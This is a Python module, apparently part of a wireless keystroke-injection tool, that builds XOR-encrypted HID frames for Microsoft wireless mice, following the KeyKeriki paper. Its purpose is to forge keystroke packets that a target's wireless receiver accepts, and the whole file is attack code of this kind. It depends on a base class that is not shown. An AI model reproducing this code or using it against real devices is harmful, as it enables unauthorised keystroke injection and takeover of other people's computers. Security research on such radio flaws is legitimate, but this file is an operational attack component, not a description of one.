# -*- coding: utf-8 -*-

import microsoft


class HID(microsoft.HID):
    ''' Injection code for MS mouse (encrypted) '''

    def __init__(self, address, payload):
        self.address = address
        self.device_vendor = 'Microsoft'
        self.sequence_num = 0
        self.payload_template = self.xor_crypt(payload[:].tolist())
        self.payload_template[4:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        self.payload_template[6] = 67

    def xor_crypt(self, payload):
        # MS encryption algorithm - as per KeyKeriki paper
        raw_address = self.address[::-1][:5]
        for i in range(4, len(payload)):
            payload[i] ^= raw_address[(i - 4) % 5]
        return payload

    def frame(self, key={'hid': 0, 'mod': 0}):
        return self.xor_crypt(self.checksum(self.key(self.sequence(self.payload_template[:]), key)))
